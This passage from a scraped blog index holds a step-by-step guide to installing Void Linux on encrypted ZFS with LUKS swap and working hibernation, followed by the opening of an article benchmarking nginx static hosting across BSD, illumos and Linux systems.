Datasets","text":"<pre><code>zfs create -o mountpoint=none zroot/ROOT\nzfs create -o mountpoint=/ -o canmount=noauto zroot/ROOT/${ID}\nzfs create -o mountpoint=/home zroot/home\n\nzpool set bootfs=zroot/ROOT/${ID} zroot\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#export-and-reimport-for-installation","title":"Export and Reimport for Installation","text":"<pre><code>zpool export zroot\nzpool import -N -R /mnt zroot\nzfs load-key -L prompt zroot\n\nzfs mount zroot/ROOT/${ID}\nzfs mount zroot/home\n\nudevadm trigger\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#install-the-base-system","title":"Install the Base System","text":"<pre><code>XBPS_ARCH=x86_64 xbps-install \\\n  -S -R https://mirrors.servercentral.com/voidlinux/current \\\n  -r /mnt base-system\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#copy-host-configuration","title":"Copy Host Configuration","text":"<p>Copy the files we generated earlier to the new system:</p> <pre><code>cp /etc/hostid /mnt/etc\nmkdir -p /mnt/etc/zfs\ncp /etc/zfs/zroot.key /mnt/etc/zfs\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#configure-encrypted-swap","title":"Configure Encrypted Swap","text":"<p>Now we'll set up the encrypted swap partition. This is where the hibernation magic happens - by using a separate LUKS-encrypted partition instead of a ZFS zvol, we can properly resume from hibernation.</p> <p>Format the swap partition with LUKS:</p> <pre><code>cryptsetup luksFormat --type luks1 \"$SWAP_DEVICE\"\n</code></pre> <p>Open the encrypted partition, create the swap filesystem, and activate it:</p> <pre><code>cryptsetup luksOpen \"$SWAP_DEVICE\" cryptswap\nmkswap /dev/mapper/cryptswap\nswapon /dev/mapper/cryptswap\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#preserve-variables-for-chroot","title":"Preserve Variables for Chroot","text":"<p>Before entering the chroot, save the disk variables so they remain available inside the new environment:</p> <pre><code>cat &lt;&lt; EOF &gt; /mnt/root/disk-vars.sh\nexport DISK=\"$DISK\"\nexport PART_SEP=\"$PART_SEP\"\nexport BOOT_PART=\"$BOOT_PART\"\nexport SWAP_PART=\"$SWAP_PART\"\nexport POOL_PART=\"$POOL_PART\"\nexport BOOT_DEVICE=\"$BOOT_DEVICE\"\nexport SWAP_DEVICE=\"$SWAP_DEVICE\"\nexport POOL_DEVICE=\"$POOL_DEVICE\"\nexport ID=\"$ID\"\nEOF\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#enter-the-chroot-environment","title":"Enter the Chroot Environment","text":"<pre><code>xchroot /mnt\n</code></pre> <p>From this point forward, all commands are executed inside the new system.</p> <p>First, load the saved variables:</p> <pre><code>source /root/disk-vars.sh\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#configure-fstab","title":"Configure fstab","text":"<p>Add the swap entry to <code>/etc/fstab</code>:</p> <pre><code>/dev/mapper/cryptswap   none            swap            defaults        0 0\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#set-up-automatic-swap-unlock","title":"Set Up Automatic Swap Unlock","text":"<p>To avoid entering the swap password separately after unlocking the ZFS pool, we'll create a keyfile stored on the encrypted ZFS dataset. This is secure because the keyfile only becomes accessible after the ZFS pool is unlocked.</p> <p>First, install cryptsetup in the new system:</p> <pre><code>xbps-install -S cryptsetup\n</code></pre> <p>Generate a random keyfile and add it to the LUKS partition:</p> <pre><code>dd bs=1 count=64 if=/dev/urandom of=/boot/volume.key\n\ncryptsetup luksAddKey \"$SWAP_DEVICE\" /boot/volume.key\n\nchmod 000 /boot/volume.key\nchmod -R g-rwx,o-rwx /boot\n</code></pre> <p>Add the keyfile to <code>/etc/crypttab</code>:</p> <pre><code>echo \"cryptswap   $SWAP_DEVICE   /boot/volume.key   luks\" &gt;&gt; /etc/crypttab\n</code></pre> <p>Include the keyfile and crypttab in the initramfs. Create <code>/etc/dracut.conf.d/10-crypt.conf</code>:</p> <pre><code>install_items+=\" /boot/volume.key /etc/crypttab \"\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#basic-system-configuration","title":"Basic System Configuration","text":"<p>Configure keyboard layout and hardware clock. Adjust the keymap and timezone to match your location:</p> <pre><code>cat &lt;&lt; EOF &gt;&gt; /etc/rc.conf\nKEYMAP=\"us\"\nHARDWARECLOCK=\"UTC\"\nEOF\n\nln -sf /usr/share/zoneinfo/Europe/Rome /etc/localtime\n</code></pre> <p>Configure locales:</p> <pre><code>cat &lt;&lt; EOF &gt;&gt; /etc/default/libc-locales\nen_US.UTF-8 UTF-8\nen_US ISO-8859-1\nEOF\n\necho \"LANG=en_US.UTF-8\" &gt; /etc/locale.conf\n\nxbps-reconfigure -f glibc-locales\n</code></pre> <p>Set the root password:</p> <pre><code>passwd\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#configure-zfs-boot-support","title":"Configure ZFS Boot Support","text":"<pre><code>cat &lt;&lt; EOF &gt; /etc/dracut.conf.d/zol.conf\nnofsck=\"yes\"\nadd_dracutmodules+=\" zfs \"\nomit_dracutmodules+=\" btrfs \"\ninstall_items+=\" /etc/zfs/zroot.key \"\nEOF\n</code></pre> <p>Install ZFS:</p> <pre><code>xbps-install -S zfs\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#configure-zfsbootmenu","title":"Configure ZFSBootMenu","text":"<p>Set the basic boot properties:</p> <pre><code>zfs set org.zfsbootmenu:commandline=\"quiet\" zroot/ROOT\nzfs set org.zfsbootmenu:keysource=\"zroot/ROOT/${ID}\" zroot\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#the-critical-step-hibernation-support","title":"The Critical Step: Hibernation Support","text":"<p>Now we need to configure hibernation resume. This is the key insight that makes this setup work: normally, the encrypted ZFS root mounts first, and then it unlocks the swap partition. But when resuming from hibernation, the kernel needs to read the hibernation image from swap before mounting the root filesystem - otherwise, the saved state would be lost.</p> <p>To solve this, we tell ZFSBootMenu to unlock the swap partition early, before mounting ZFS, by specifying its LUKS UUID.</p> <p>Get the UUID of your swap partition:</p> <pre><code>blkid \"$SWAP_DEVICE\"\n</code></pre> <p>You'll see output like:</p> <pre><code>/dev/...: UUID=\"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\" TYPE=\"crypto_LUKS\" PARTUUID=\"...\"\n</code></pre> <p>Store the UUID in a variable for the next step:</p> <pre><code>SWAP_UUID=$(blkid -s UUID -o value \"$SWAP_DEVICE\")\necho \"Swap UUID: $SWAP_UUID\"\n</code></pre> <p>Now set the boot parameters using the captured UUID:</p> <pre><code>zfs set org.zfsbootmenu:commandline=\"rd.luks.uuid=$SWAP_UUID resume=/dev/mapper/cryptswap\" zroot/ROOT/${ID}\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#set-up-efi-boot","title":"Set Up EFI Boot","text":"<p>Create and mount the EFI partition:</p> <pre><code>mkfs.vfat -F32 \"$BOOT_DEVICE\"\n\nmkdir -p /boot/efi\n</code></pre> <p>Add the EFI partition to <code>/etc/fstab</code> using its UUID:</p> <pre><code>BOOT_UUID=$(blkid -s UUID -o value \"$BOOT_DEVICE\")\necho \"UUID=$BOOT_UUID    /boot/efi    vfat    defaults    0 0\" &gt;&gt; /etc/fstab\n</code></pre> <p>Mount it:</p> <pre><code>mount /boot/efi\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#install-zfsbootmenu","title":"Install ZFSBootMenu","text":"<pre><code>xbps-install -S curl\n\nmkdir -p /boot/efi/EFI/ZBM\ncurl -o /boot/efi/EFI/ZBM/VMLINUZ.EFI -L https://get.zfsbootmenu.org/efi\ncp /boot/efi/EFI/ZBM/VMLINUZ.EFI /boot/efi/EFI/ZBM/VMLINUZ-BACKUP.EFI\n</code></pre> <p>Configure the EFI boot entries:</p> <pre><code>xbps-install -S efibootmgr\n\nefibootmgr -c -d \"$DISK\" -p \"$BOOT_PART\" \\\n  -L \"ZFSBootMenu (Backup)\" \\\n  -l '\\EFI\\ZBM\\VMLINUZ-BACKUP.EFI'\n\nefibootmgr -c -d \"$DISK\" -p \"$BOOT_PART\" \\\n  -L \"ZFSBootMenu\" \\\n  -l '\\EFI\\ZBM\\VMLINUZ.EFI'\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#microcode-updates","title":"Microcode updates","text":"<p>Void Linux is modular, so you may need to install additional packages for your specific hardware. For the Intel microcode, you need the non-free repo: For example:</p> <pre><code># For Intel CPUs\nxbps-install -S void-repo-nonfree \nxbps-install -S intel-ucode\n\n# For AMD CPUs/GPUs\nxbps-install -S linux-firmware-amd\n</code></pre> <p>After installing microcode updates, regenerate the boot images and exit:</p> <pre><code>xbps-reconfigure -fa\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#desktop-installation-optional","title":"Desktop Installation (Optional)","text":"<p>If all you need is a minimal system or a server, you're done and ready to reboot. For a complete desktop environment, continue with the following steps.</p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#install-core-desktop-packages","title":"Install Core Desktop Packages","text":"<pre><code>xbps-install -S vim nano dbus elogind polkit xorg xorg-fonts xorg-video-drivers xorg-input-drivers dejavu-fonts-ttf terminus-font NetworkManager pipewire alsa-pipewire wireplumber xdg-user-dirs unzip gzip xz 7zip\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#install-kde-plasma","title":"Install KDE Plasma","text":"<pre><code>xbps-install -S kde-plasma dolphin konsole firefox kdegraphics-thumbnailers ffmpegthumbs vlc ark kwrite discover kf6-purpose\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#enable-services","title":"Enable Services","text":"<pre><code>ln -s /etc/sv/NetworkManager /etc/runit/runsvdir/default/\nln -s /etc/sv/dbus /etc/runit/runsvdir/default/\nln -s /etc/sv/udevd /etc/runit/runsvdir/default/\nln -s /etc/sv/polkitd /etc/runit/runsvdir/default/\nln -s /etc/sv/sddm /etc/runit/runsvdir/default/\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#configure-pipewire-audio","title":"Configure PipeWire Audio","text":"<pre><code>mkdir -p /etc/xdg/autostart\nln -sf /usr/share/applications/pipewire.desktop /etc/xdg/autostart/\n\nmkdir -p /etc/pipewire/pipewire.conf.d\nln -sf /usr/share/examples/wireplumber/10-wireplumber.conf /etc/pipewire/pipewire.conf.d/\nln -sf /usr/share/examples/pipewire/20-pipewire-pulse.conf /etc/pipewire/pipewire.conf.d/\n\nmkdir -p /etc/alsa/conf.d\nln -sf /usr/share/alsa/alsa.conf.d/50-pipewire.conf /etc/alsa/conf.d\nln -sf /usr/share/alsa/alsa.conf.d/99-pipewire-default.conf /etc/alsa/conf.d\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#enable-additional-repositories-and-flatpak-optional","title":"Enable Additional Repositories and Flatpak (Optional)","text":"<pre><code>xbps-install -S void-repo-nonfree void-repo-multilib void-repo-multilib-nonfree\n\nxbps-install -S flatpak\nflatpak remote-add --if-not-exists flathub https://dl.flathub.org/repo/flathub.flatpakrepo\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#create-a-regular-user-and-exit","title":"Create a Regular User and exit","text":"<p>For desktop use, create a non-root user with appropriate group memberships. Replace <code>username</code> with your desired username.</p> <pre><code>useradd -m username\npasswd username\nusermod username -G video,wheel,plugdev,kvm,audio,network\nexit\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#fix-for-networkmanager","title":"Fix for NetworkManager","text":"<p>xchroot will bind mount /etc/resolv.conf and leave an empty file. Network Manager won't like it. So let's clean it up:</p> <pre><code>umount -l /mnt/etc/resolv.conf 2&gt;/dev/null || true\n\nrm -f /mnt/etc/resolv.conf\nln -s /run/NetworkManager/resolv.conf /mnt/etc/resolv.conf\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#exit-and-reboot","title":"Exit and Reboot","text":"<pre><code>umount -n -R /mnt\nzpool export zroot\nreboot\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#post-installation","title":"Post-Installation","text":"<p>If everything went well, after entering your ZFS encryption password, you'll be greeted by the SDDM login screen.</p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#testing-hibernation","title":"Testing Hibernation","text":"<p>To verify that hibernation works correctly, you can clock the \"Hibernate\" button or:</p> <pre><code>loginctl hibernate\n</code></pre> <p>The system should power off. When you turn it back on, ZFSBootMenu will prompt for the password, unlock the swap partition, detect the hibernation image, and resume your session exactly where you left off.</p> <p>If resume fails, check that: 1. The LUKS UUID in the ZFS commandline property matches your swap partition 2. The swap partition is large enough for your RAM 3. The dracut configuration includes the crypttab and keyfile</p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#conclusion","title":"Conclusion","text":"<p>You now have a fully functional Void Linux system with native ZFS, full disk encryption, and working hibernation. The system is rolling, lightweight, and easy to maintain. Enjoy!</p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#tags","title":"Tags:","text":"<p>linux desktop zfs server tutorial ownyourdata voidlinux</p> <p>&lt;- Next PostTime Machine inside a FreeBSD jailPrevious Post -&gt;Why I (still) love Linux</p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#you-may-also-like","title":"You may also like","text":""},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#moving-an-entire-freebsd-installation-to-a-new-host-or-vm-in-a-few-easy-steps","title":"Moving an entire FreeBSD installation to a new host or VM in a few easy steps","text":"<p>16/09/2024 09:41:00  by Stefano Marinelli</p> <p>A comprehensive guide on how to move a FreeBSD installation, including the operating system, from one host to another, with a focus on ZFS and bootloader configurations (UEFI and BIOS).</p> <p>Read More</p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#how-we-are-migrating-many-of-our-servers-from-linux-to-freebsd-part-2-backups-and-disaster-recovery","title":"How we are migrating (many of) our servers from Linux to FreeBSD - Part 2 - Backups and Disaster Recovery","text":"<p>30/05/2022 03:03:52  by Stefano Marinelli</p> <p>Some details on how we're performing backups and disaster recovery of the migrated servers.</p> <p>Read More</p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#how-we-are-migrating-many-of-our-servers-from-linux-to-freebsd-part-1-system-and-jails-setup","title":"How we are migrating (many of) our servers from Linux to FreeBSD - Part 1 - System and jails setup","text":"<p>05/02/2022 10:10:47  by Stefano Marinelli</p> <p>Read More</p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#about","title":"About","text":"<p>Scattered IT Notes - by Stefano Marinelli</p> <p></p> <p>EuroBSDCon 2025 - Zagreb, Croatia; September 25-28, 2025.</p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#categories","title":"Categories","text":"<ul> <li>server</li> <li>freebsd</li> <li>hosting</li> <li>ownyourdata</li> <li>tutorial</li> <li>linux</li> <li>data</li> <li>networking</li> <li>zfs</li> <li>jail</li> <li>container</li> <li>filesystems</li> <li>series</li> <li>web</li> <li>backup</li> <li>View All Categories</li> </ul>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#links","title":"Links","text":"<ul> <li>Home</li> <li>Archives</li> <li>Tags</li> <li>Categories</li> <li>Series</li> <li>Under The Hood</li> <li>Professional Services</li> <li>About</li> <li>RSS</li> </ul> <p>(C) 2026 IT Notes. All rights reserved. </p> <p>Generated with ITNBlog on 29/01/2026 09:12:41 UTC </p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20260205/","title":"Installing Void Linux on ZFS with Hibernation Support\\n\\n\u6765\u6e90: https://it-notes.dragas.net\\n\u94fe\u63a5: https://it-notes.dragas.net/2025/12/22/void-linux-zfs-hibernation-guide/\\n\u65e5\u671f: Mon, 22 Dec 2025 08:43:02 +0000\\n\\n---\\n\\nA practical guide to installing Void Linux on an encrypted ZFS root with LUKS-encrypted swap and working hibernation support.","text":""},{"location":"it-notes.dragas.net/Self-hosting%20your%20Mastodon%20media%20with%20SeaweedFS_20251106/","title":"Self-hosting your Mastodon media with SeaweedFS","text":"<p>\u6765\u6e90: https://it-notes.dragas.net \u94fe\u63a5: https://it-notes.dragas.net/2025/11/06/self-hosting-your-mastodon-media-with-seaweedfs/ \u65e5\u671f: Thu, 06 Nov 2025 11:30:02 +0000</p> <p>A practical guide to boosting Mastodon performance by self-hosting your media with SeaweedFS. Configure a fast, S3-compatible storage backend to efficiently handle your instance's files and take full control of your data.</p>"},{"location":"it-notes.dragas.net/Self-hosting%20your%20Mastodon%20media%20with%20SeaweedFS_20260205/","title":"Self-hosting your Mastodon media with SeaweedFS\\n\\n\u6765\u6e90: https://it-notes.dragas.net\\n\u94fe\u63a5: https://it-notes.dragas.net/2025/11/06/self-hosting-your-mastodon-media-with-seaweedfs/\\n\u65e5\u671f: Thu, 06 Nov 2025 11:30:02 +0000\\n\\n---\\n\\nA practical guide to boosting Mastodon performance by self-hosting your media with SeaweedFS. Configure a fast, S3-compatible storage backend to efficiently handle your instance's files and take full control of your data.","text":""},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/","title":"Static Web Hosting on the Intel N150: FreeBSD, SmartOS, NetBSD, OpenBSD and Linux Compared","text":"<p>\u6765\u6e90: https://it-notes.dragas.net \u94fe\u63a5: https://it-notes.dragas.net/2025/11/19/static-web-hosting-intel-n150-freebsd-smartos-netbsd-openbsd-linux/ \u65e5\u671f: Wed, 19 Nov 2025 09:16:00 +0100</p> <p>Skip to main content [Access Key: S]</p> <p>Notice: This site works best with JavaScript enabled, but all content is accessible without it. Skip to main content</p> <p>IT NotesOpen navigation menu</p> <ul> <li>Home</li> <li>Archives</li> <li>Categories</li> <li>Tags</li> <li>Series</li> <li>Under The Hood</li> <li>Professional Services</li> <li>About</li> </ul> <p>Search articles and pages Enter keywords to search articles and pages Submit search</p> <p></p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#static-web-hosting-on-the-intel-n150-freebsd-smartos-netbsd-openbsd-and-linux-compared_1","title":"Static Web Hosting on the Intel N150: FreeBSD, SmartOS, NetBSD, OpenBSD and Linux Compared","text":"<p>FreeBSDNetBSDOpenBSD</p> <p>20 min read</p> <p>19/11/2025 09:16:00 \u00e2\u0080\u00a2 Last modified:  21/11/2025 18:45:00 </p> <p>by Stefano Marinelli</p> <p>A server rack with some servers and cables </p> <p>Categories:  freebsd,  smartos,  illumos,  linux,  netbsd,  openbsd,  jail,  zones,  docker,  hosting,  server,  sysadmin,  ownyourdata</p> <p>Tags: freebsd, smartos, illumos, linux, netbsd, openbsd, jail, zones, docker, hosting, server, sysadmin, ownyourdata</p> <p>Update : This post has been updated to include Docker benchmarks and a comparison of container overhead versus FreeBSD Jails and illumos Zones.</p> <p>Note : Some operating systems (FreeBSD and Linux) support kernel TLS (kTLS) and the related SSL_sendfile path in nginx, which can improve HTTPS performance for static files. Since this feature is not available on all the systems included in the comparison (for example NetBSD, OpenBSD and illumos), the benchmarks were run with a common baseline configuration that does not rely on kTLS. The goal is to compare the systems under similar conditions rather than to measure OS specific optimizations.</p> <p>I often get very specific infrastructure requests from clients. Most of the time it is some form of hosting. My job is usually to suggest and implement the setup that fits their goals, skills and long term plans. </p> <p>If there are competent technicians on the other side, and they are willing to learn or already comfortable with Unix style systems, my first choices are usually one of the BSDs or an illumos distribution. If they need a control panel, or they already have a lot of experience with a particular stack that will clearly help them, I will happily use Linux and it usually delivers solid, reliable results. </p> <p>Every now and then someone asks the question I like the least: </p> <p>\u00e2\u0080\u009cBut how does it perform compared to X or Y?\u00e2\u0080\u009d </p> <p>I have never been a big fan of benchmarks. At best they capture a very specific workload on a very specific setup. They are almost never a perfect reflection of what will happen in the real world. </p> <p>For example, I discovered that idle bhyve VMs seem to use fewer resources when the host is illumos than when the host is FreeBSD. It looks strange at first sight, but the illumos people are clearly working very hard on this, and the result is a very capable and efficient platform. </p> <p>Despite my skepticism, from time to time I enjoy running some comparative tests. I already did it with Proxmox KVM versus FreeBSD bhyve, and I also compared Jails, Zones, bhyve and KVM on the same Intel N150 box. That led to the FreeBSD vs SmartOS article where I focused on CPU and memory performance on this small mini PC. </p> <p>This time I wanted to do something simpler, but also closer to what I see every day: static web hosting.</p> <p>Instead of synthetic CPU or I/O tests, I wanted to measure how different operating systems behave when they serve a small static site with nginx, both over HTTP and HTTPS. </p> <p>This is not meant to be a super rigorous benchmark. I used the default nginx packages, almost default configuration, and did not tune any OS specific kernel settings. In my experience, careful tuning of kernel and network parameters can easily move numbers by several tens of percentage points. The problem is that very few people actually spend time chasing such optimizations. Much more often, once a limit is reached, someone yells \u00e2\u0080\u009cwe need mooooar powaaaar\u00e2\u0080\u009d while the real fix would be to tune the existing stack a bit.</p> <p>So the question I want to answer here is more modest and more practical:</p> <p>With default nginx and a small static site, how much does the choice of host OS really matter on this Intel N150 mini PC?</p> <p>Spoiler : less than people think, at least for plain HTTP. Things get more interesting once TLS enters the picture.</p> <p>Disclaimer  These benchmarks are a snapshot of my specific hardware, network and configuration. They are useful to compare relative behavior on this setup. They are not a universal ranking of operating systems. Different CPUs, NICs, crypto extensions, kernel versions or nginx builds can completely change the picture. </p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#test-setup","title":"Test setup","text":"<p>The hardware is the same Intel N150 mini PC I used in my previous tests: a small, low power box that still has enough cores to be interesting for lab and small production workloads. </p> <p>On it, I installed several operating systems and environments, always on the bare metal, not nested inside each other. On each OS I installed nginx from the official packages. </p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#software-under-test","title":"Software under test","text":"<p>On the host: </p> <p>SmartOS , with: - a Debian 12 LX zone - an Alpine Linux 3.22 LX zone - a native SmartOS zone </p> <p>FreeBSD 14.3-RELEASE: - nginx running inside a native jail </p> <p>OpenBSD 7.8: - nginx on the host </p> <p>NetBSD 10.1: - nginx on the host </p> <p>Debian 13.2: - nginx on the host </p> <p>Alpine Linux 3.22: - nginx on the host - Docker: Debian 13 container running on the Alpine host (ports mapped)</p> <p>I also tried to include DragonFlyBSD , but the NIC in this box is not supported. Using a different NIC just for one OS would have made the comparison meaningless, so I excluded it. </p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#nginx-configuration","title":"nginx configuration","text":"<p>In all environments: </p> <ul> <li>nginx was installed from the system packages </li> <li><code>worker_processes</code> was set to <code>auto</code></li> <li>the web root contained the same static content </li> </ul> <p>The important part is that I used exactly the same<code>nginx.conf</code> file for all operating systems and all combinations in this article. I copied the same configuration file verbatim to every host, jail and zone. The only changes were the IP address and file paths where needed, for example for the TLS certificate and key. </p> <p>The static content was a default build of the example site generated by BSSG , my Bash static site generator. The web root was the same logical structure on every OS and container type. </p> <p>There is no OS specific tuning in the configuration and no kernel level tweaks. This is very close to a \u00e2\u0080\u009cpackage install plus minimal config\u00e2\u0080\u009d situation. </p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#tls-configuration","title":"TLS configuration","text":"<p>For HTTPS I used a very simple configuration, identical on every host. </p> <p>Self signed certificate created with: </p> <pre><code>openssl req -x509 -newkey rsa:4096 -nodes -keyout server.key -out server.crt -days 365 -subj \"/CN=localhost\"\n</code></pre> <p>Example nginx <code>server</code> block for HTTPS (simplified): </p> <pre><code>server {  \nlisten 443 ssl http2;  \nlisten [::]:443 ssl http2;\n\nserver_name _;\n\nssl_certificate /etc/nginx/ssl/server.crt;  \nssl_certificate_key /etc/nginx/ssl/server.key;\n\nroot /var/www/html;  \nindex index.html index.htm;\n\nlocation / {  \ntry_files $uri $uri/ =404;  \n}  \n}\n</code></pre> <p>The HTTP virtual host is also the same everywhere, with the root pointing to the BSSG example site. </p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#load-generator","title":"Load generator","text":"<p>The tests were run from my workstation on the same LAN: </p> <ul> <li>client host: a mini PC machine connected at 2.5 Gbit/s </li> <li>switch: 2.5 Gbit/s </li> <li>test tool: <code>wrk</code></li> </ul> <p>For each target host I ran: </p> <ul> <li><code>wrk -t4 -c50 -d10s http://IP</code></li> <li><code>wrk -t4 -c10 -d10s http://IP</code></li> <li><code>wrk -t4 -c50 -d10s https://IP</code></li> <li><code>wrk -t4 -c10 -d10s https://IP</code></li> </ul> <p>Each scenario was executed multiple times to reduce noise; the numbers below are medians (or very close to them) from the runs.</p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#the-contenders","title":"The contenders","text":"<p>To keep things readable, I will refer to each setup as follows: </p> <ul> <li>SmartOS Debian LX \u00e2\u0086\u0092 SmartOS host, Debian 12 LX zone </li> <li>SmartOS Alpine LX \u00e2\u0086\u0092 SmartOS host, Alpine 3.22 LX zone </li> <li>SmartOS Native \u00e2\u0086\u0092 SmartOS host, native zone </li> <li>FreeBSD Jail \u00e2\u0086\u0092 FreeBSD 14.3-RELEASE, nginx in a jail </li> <li>OpenBSD Host \u00e2\u0086\u0092 OpenBSD 7.8, nginx on the host </li> <li>NetBSD Host \u00e2\u0086\u0092 NetBSD 10.1, nginx on the host </li> <li>Debian Host \u00e2\u0086\u0092 Debian 13.2, nginx on the host </li> <li>Alpine Host \u00e2\u0086\u0092 Alpine 3.22, nginx on the host </li> <li>Docker Container \u00e2\u0086\u0092 Alpine host, Debian 13 Docker container</li> </ul> <p>Everything uses the same nginx configuration file and the same static site. </p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#static-http-results","title":"Static HTTP results","text":"<p>Let us start with plain HTTP, since this removes TLS from the picture and focuses on the kernel, network stack and nginx itself. </p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#http-4-threads-50-concurrent-connections","title":"HTTP, 4 threads, 50 concurrent connections","text":"<p>Approximate median <code>wrk</code> results: </p> Environment HTTP 50 connections SmartOS Debian LX ~46.2 k SmartOS Alpine LX ~49.2 k SmartOS Native ~63.7 k FreeBSD Jail ~63.9 k OpenBSD Host ~64.1 k NetBSD Host ~64.0 k Debian Host ~63.8 k Alpine Host ~63.9 k Docker Container ~63.7 k <p>Two things stand out: </p> <ol> <li>All the native or jail/container setups on the hosts that are not LX zones cluster around 63 to 64k requests per second. </li> <li>The two SmartOS LX zones sit slightly lower, in the 46 to 49k range, which is still very respectable for this hardware. </li> </ol> <p>In other words, as long as you are on the host or in 